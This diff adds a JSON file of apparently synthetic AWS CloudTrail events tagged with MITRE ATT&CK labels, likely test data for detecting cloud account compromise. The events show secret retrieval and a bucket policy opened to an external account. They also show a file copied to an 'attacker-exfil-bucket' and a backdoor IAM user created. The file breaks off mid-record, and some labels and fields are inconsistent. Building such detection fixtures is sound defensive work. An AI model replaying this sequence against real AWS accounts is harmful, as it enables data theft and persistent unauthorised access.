@@ -1,0 +1,974 @@
+[
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE23602",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA203501260829"
+    },
+    "eventTime": "2024-12-15T08:00:00Z",
+    "eventSource": "signin.amazonaws.com",
+    "eventName": "ConsoleLogin",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "10.0.1.45",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {},
+    "responseElements": {
+      "ConsoleLogin": "Success"
+    },
+    "eventID": "5d31dea3-ee94-409f-bd45-9b4d04a6b3e1",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1078 - Valid Accounts",
+    "mitreAttackTactic": "Initial Access",
+    "additionalEventData": {
+      "MobileVersion": "No",
+      "LoginTo": "https://console.aws.amazon.com/console/home",
+      "MFAUsed": "Yes"
+    }
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE47939",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA526924695344"
+    },
+    "eventTime": "2024-12-15T08:34:00Z",
+    "eventSource": "sts.amazonaws.com",
+    "eventName": "GetCallerIdentity",
+    "awsRegion": "eu-central-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "aws-cli/2.15.0 Python/3.12.0 Linux/6.7.4",
+    "requestParameters": {},
+    "responseElements": {
+      "Account": "123456789012"
+    },
+    "eventID": "ef82bee5-138c-467c-8415-642ec27b86db",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1078 - Valid Accounts",
+    "mitreAttackTactic": "Credential Access"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE18648",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA412849235393"
+    },
+    "eventTime": "2024-12-15T08:35:00Z",
+    "eventSource": "s3.amazonaws.com",
+    "eventName": "ListBuckets",
+    "awsRegion": "eu-central-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "console.amazonaws.com",
+    "requestParameters": {},
+    "responseElements": {
+      "buckets": [
+        "corp-prod-data-lake"
+      ]
+    },
+    "eventID": "fc3f8237-ad61-4fce-8aaa-f786ebacc897",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1078 - Valid Accounts",
+    "mitreAttackTactic": "Credential Access"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE48124",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA343741929005"
+    },
+    "eventTime": "2024-12-15T08:36:00Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "ListRoles",
+    "awsRegion": "eu-central-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {},
+    "responseElements": {},
+    "eventID": "c6b37a98-fc3a-40fe-b119-5f0b5f8eac83",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1078 - Valid Accounts",
+    "mitreAttackTactic": "Credential Access"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE51873",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA481876927343"
+    },
+    "eventTime": "2024-12-15T08:37:00Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "ListUsers",
+    "awsRegion": "eu-central-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {},
+    "responseElements": {},
+    "eventID": "2f27e005-0f43-4bc0-8d16-bc3a6994fc85",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1078 - Valid Accounts",
+    "mitreAttackTactic": "Credential Access"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE70980",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA122579312394"
+    },
+    "eventTime": "2024-12-15T08:38:00Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "GetAccountAuthorizationDetails",
+    "awsRegion": "eu-central-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "Boto3/1.34.0 Python/3.11.5",
+    "requestParameters": {},
+    "responseElements": {},
+    "eventID": "d3748ec2-5464-4fdd-ae2f-4040f8de1036",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1078 - Valid Accounts",
+    "mitreAttackTactic": "Credential Access"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE91547",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA365999428483"
+    },
+    "eventTime": "2024-12-15T08:39:00Z",
+    "eventSource": "ec2.amazonaws.com",
+    "eventName": "DescribeInstances",
+    "awsRegion": "eu-central-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {},
+    "responseElements": {},
+    "eventID": "c46abba6-14e1-4d92-a0bc-337dd7080f7c",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1078 - Valid Accounts",
+    "mitreAttackTactic": "Credential Access"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE12127",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA488578902275"
+    },
+    "eventTime": "2024-12-15T08:40:00Z",
+    "eventSource": "secretsmanager.amazonaws.com",
+    "eventName": "ListSecrets",
+    "awsRegion": "eu-central-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {},
+    "responseElements": {},
+    "eventID": "409a7df2-8f4f-4540-b417-657079123808",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1078 - Valid Accounts",
+    "mitreAttackTactic": "Credential Access"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE31913",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA248339236279"
+    },
+    "eventTime": "2024-12-15T08:41:00Z",
+    "eventSource": "secretsmanager.amazonaws.com",
+    "eventName": "GetSecretValue",
+    "awsRegion": "eu-central-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {
+      "secretId": "prod/db/password"
+    },
+    "responseElements": {
+      "SecretString": "REDACTED"
+    },
+    "eventID": "d49ea103-894f-46b1-9157-3c3cb796ebc6",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1078 - Valid Accounts",
+    "mitreAttackTactic": "Credential Access"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE18911",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA184574254180"
+    },
+    "eventTime": "2024-12-15T08:42:00Z",
+    "eventSource": "kms.amazonaws.com",
+    "eventName": "ListKeys",
+    "awsRegion": "eu-central-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "aws-cli/2.15.0 Python/3.12.0 Linux/6.7.4",
+    "requestParameters": {},
+    "responseElements": {},
+    "eventID": "7c2e0df5-bf0e-4b9c-9302-f794171d8c97",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1078 - Valid Accounts",
+    "mitreAttackTactic": "Credential Access"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE26402",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA701724168025"
+    },
+    "eventTime": "2024-12-15T09:00:00Z",
+    "eventSource": "s3.amazonaws.com",
+    "eventName": "GetObject",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "45.33.32.156",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {
+      "bucketName": "corp-prod-data-lake",
+      "key": "finance/Q4-2024-revenue.csv"
+    },
+    "responseElements": null,
+    "eventID": "7707a170-9870-4ee8-8d2b-91357d319dfa",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1530 - Data from Cloud Storage",
+    "mitreAttackTactic": "Collection",
+    "resources": [
+      {
+        "type": "AWS::S3::Object",
+        "ARN": "arn:aws:s3:::corp-prod-data-lake/finance/Q4-2024-revenue.csv"
+      }
+    ]
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE81369",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA638109149144"
+    },
+    "eventTime": "2024-12-15T10:00:00Z",
+    "eventSource": "s3.amazonaws.com",
+    "eventName": "PutBucketPolicy",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "91.108.4.200",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {
+      "bucketName": "corp-prod-data-lake",
+      "policy": "{\"Version\": \"2012-10-17\", \"Statement\": [{\"Effect\": \"Allow\", \"Principal\": {\"AWS\": \"arn:aws:iam::998877665544:root\"}, \"Action\": [\"s3:GetObject\", \"s3:ListBucket\"], \"Resource\": [\"arn:aws:s3:::corp-prod-data-lake\", \"arn:aws:s3:::corp-prod-data-lake/*\"]}]}"
+    },
+    "responseElements": null,
+    "eventID": "976d7bea-b4aa-43b4-972e-b3552a9e35d7",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1537 - Transfer Data to Cloud Account",
+    "mitreAttackTactic": "Exfiltration"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE91616",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA301713070889"
+    },
+    "eventTime": "2024-12-15T10:02:00Z",
+    "eventSource": "s3.amazonaws.com",
+    "eventName": "CopyObject",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "91.108.4.200",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {
+      "destinationBucket": "attacker-exfil-bucket-xk92m",
+      "destinationKey": "finance/Q4-2024-revenue.csv",
+      "x-amz-copy-source": "corp-prod-data-lake/finance/Q4-2024-revenue.csv",
+      "x-amz-copy-source-account": "123456789012"
+    },
+    "responseElements": {
+      "CopyObjectResult": {
+        "eTag": "\"d41d8cd98f00b204e98009900000\"",
+        "lastModified": "2024-12-15T10:02:00Z"
+      }
+    },
+    "eventID": "cad4e1ee-1ecc-4f83-8649-80e5c3d30a68",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1537 - Transfer Data to Cloud Account",
+    "mitreAttackTactic": "Exfiltration",
+    "externalAccountId": "998877665544"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE18325",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA886312642497"
+    },
+    "eventTime": "2024-12-15T11:00:21Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "ListGroups",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {},
+    "responseElements": {
+      "Groups": []
+    },
+    "eventID": "9290992b-a907-4969-a700-95632e167989",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE72420",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA184391869734"
+    },
+    "eventTime": "2024-12-15T11:00:28Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "ListPolicies",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {
+      "scope": "Local"
+    },
+    "responseElements": {
+      "Policies": []
+    },
+    "eventID": "bd1ef97f-1c94-4d1b-8f3a-6ea5f306015f",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE87975",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA881322367825"
+    },
+    "eventTime": "2024-12-15T11:00:42Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "ListAttachedUserPolicies",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {
+      "userName": "alice@corp.com"
+    },
+    "responseElements": {},
+    "eventID": "3166cd26-ffef-4867-a4fa-f7e0c501f9a4",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE39027",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA235785835773"
+    },
+    "eventTime": "2024-12-15T11:00:56Z",
+    "eventSource": "ec2.amazonaws.com",
+    "eventName": "DescribeSecurityGroups",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "Boto3/1.34.0 Python/3.11.5",
+    "requestParameters": {},
+    "responseElements": {
+      "SecurityGroups": []
+    },
+    "eventID": "283689ff-b5a6-4c65-b438-569da5a01415",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE61248",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA836119980904"
+    },
+    "eventTime": "2024-12-15T11:01:03Z",
+    "eventSource": "ec2.amazonaws.com",
+    "eventName": "DescribeSubnets",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-cli/2.15.0 Python/3.12.0 Linux/6.7.4",
+    "requestParameters": {},
+    "responseElements": {
+      "Subnets": []
+    },
+    "eventID": "9955307a-64b9-459f-86e1-7ff03ba67214",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE26114",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA909694152537"
+    },
+    "eventTime": "2024-12-15T11:01:10Z",
+    "eventSource": "ec2.amazonaws.com",
+    "eventName": "DescribeVpcs",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {},
+    "responseElements": {
+      "Vpcs": []
+    },
+    "eventID": "01fd2504-e693-47c0-b15d-c08ae26eb3a8",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE13134",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA446767169900"
+    },
+    "eventTime": "2024-12-15T11:01:17Z",
+    "eventSource": "ec2.amazonaws.com",
+    "eventName": "DescribeKeyPairs",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {},
+    "responseElements": {
+      "KeyPairs": []
+    },
+    "eventID": "5a4f9ef1-64ca-4ae9-98da-5f4393ec19e7",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE85033",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA200536464808"
+    },
+    "eventTime": "2024-12-15T11:01:31Z",
+    "eventSource": "lambda.amazonaws.com",
+    "eventName": "ListFunctions",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "console.amazonaws.com",
+    "requestParameters": {},
+    "responseElements": {
+      "Functions": []
+    },
+    "eventID": "02b4abf8-eb64-4805-817e-13a5f82637fc",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE79051",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA185823234870"
+    },
+    "eventTime": "2024-12-15T11:01:38Z",
+    "eventSource": "rds.amazonaws.com",
+    "eventName": "DescribeDBInstances",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "console.amazonaws.com",
+    "requestParameters": {},
+    "responseElements": {
+      "DBInstances": []
+    },
+    "eventID": "6c16b58a-b0c8-47fd-b57e-ffcce3a544d9",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE82045",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA971856350692"
+    },
+    "eventTime": "2024-12-15T11:01:45Z",
+    "eventSource": "sns.amazonaws.com",
+    "eventName": "ListTopics",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-cli/2.15.0 Python/3.12.0 Linux/6.7.4",
+    "requestParameters": {},
+    "responseElements": {
+      "Topics": []
+    },
+    "eventID": "b010ca3b-1d96-449b-ae51-3dfa82ae4b3d",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE99034",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA450627366405"
+    },
+    "eventTime": "2024-12-15T11:01:52Z",
+    "eventSource": "sqs.amazonaws.com",
+    "eventName": "ListQueues",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "Boto3/1.34.0 Python/3.11.5",
+    "requestParameters": {},
+    "responseElements": {
+      "QueueUrls": []
+    },
+    "eventID": "bddc9321-8ba7-41ed-ba4c-3a87f928a5db",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE49979",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA780850775031"
+    },
+    "eventTime": "2024-12-15T11:01:59Z",
+    "eventSource": "logs.amazonaws.com",
+    "eventName": "DescribeLogGroups",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "Boto3/1.34.0 Python/3.11.5",
+    "requestParameters": {},
+    "responseElements": {
+      "logGroups": []
+    },
+    "eventID": "5ee049e2-22de-4f4e-8944-89b779215bef",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE82199",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA360194212519"
+    },
+    "eventTime": "2024-12-15T11:02:13Z",
+    "eventSource": "kms.amazonaws.com",
+    "eventName": "ListAliases",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {},
+    "responseElements": {
+      "Aliases": []
+    },
+    "eventID": "8cb07e6c-90ef-4401-a998-d55c4c2aae8f",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE10669",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA890439598215"
+    },
+    "eventTime": "2024-12-15T11:02:20Z",
+    "eventSource": "cloudtrail.amazonaws.com",
+    "eventName": "DescribeTrails",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-sdk-java/1.12.600",
+    "requestParameters": {},
+    "responseElements": {
+      "trailList": []
+    },
+    "eventID": "6de5dc2c-8b50-4f80-a641-75d37a717a73",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE62062",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA311801237155"
+    },
+    "eventTime": "2024-12-15T11:02:27Z",
+    "eventSource": "s3.amazonaws.com",
+    "eventName": "GetBucketAcl",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "console.amazonaws.com",
+    "requestParameters": {
+      "bucketName": "corp-prod-data-lake"
+    },
+    "responseElements": {},
+    "eventID": "a5b41161-dee9-438d-97e6-22b74c75de70",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE70300",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA589470035961"
+    },
+    "eventTime": "2024-12-15T11:02:34Z",
+    "eventSource": "s3.amazonaws.com",
+    "eventName": "GetBucketPolicy",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-cli/2.15.0 Python/3.12.0 Linux/6.7.4",
+    "requestParameters": {
+      "bucketName": "corp-prod-data-lake"
+    },
+    "responseElements": {},
+    "eventID": "39e7f044-21ad-492b-9480-95e5066e4537",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE41974",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA231778705810"
+    },
+    "eventTime": "2024-12-15T11:02:41Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "ListAccessKeys",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "aws-cli/2.15.0 Python/3.12.0 Linux/6.7.4",
+    "requestParameters": {
+      "userName": "alice@corp.com"
+    },
+    "responseElements": {},
+    "eventID": "775f1093-bd47-479b-b9bb-a7c314845d06",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE74289",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA364457834595"
+    },
+    "eventTime": "2024-12-15T11:02:48Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "GetAccountPasswordPolicy",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "103.21.244.0",
+    "userAgent": "Boto3/1.34.0 Python/3.11.5",
+    "requestParameters": {},
+    "responseElements": {},
+    "eventID": "649c32b0-b659-4cb5-adc4-baa2bed71ddd",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1580 - Cloud Infrastructure Discovery",
+    "mitreAttackTactic": "Discovery"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE56531",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA720101808538"
+    },
+    "eventTime": "2024-12-15T12:00:00Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "CreateUser",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "Boto3/1.34.0 Python/3.11.5",
+    "requestParameters": {
+      "userName": "support-automation"
+    },
+    "responseElements": {
+      "user": {
+        "path": "/",
+        "userName": "support-automation",
+        "userId": "AIDANEWUSER12345",
+        "arn": "arn:aws:iam::123456789012:user/support-automation",
+        "createDate": "2024-12-15T12:00:00Z"
+      }
